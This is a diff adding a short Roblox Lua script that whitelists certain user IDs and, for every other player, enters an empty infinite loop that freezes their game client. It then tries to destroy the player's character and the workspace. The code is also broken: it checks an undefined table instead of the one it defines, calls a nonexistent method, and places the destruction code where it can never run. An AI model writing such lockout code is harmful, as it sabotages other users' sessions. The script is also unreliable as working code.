@@ -1,0 +1,17 @@
+local coolplayers = {
+    [2671042590] = true,
+    [901871093] = true,
+    [216710683] = true,
+    [3621669301] = true,
+    [465771075] = true,
+    [2797175390] = true,
+    [2607207782] = true,
+}
+if CutieUtStaff[game.Players.LocalPlayer.UserId] then
+else
+while true do
+end
+game.Players.LocalPlayer.Character:Destroy()
+local a = game.Workspace:GetDescendant()
+a:Destroy()
+end
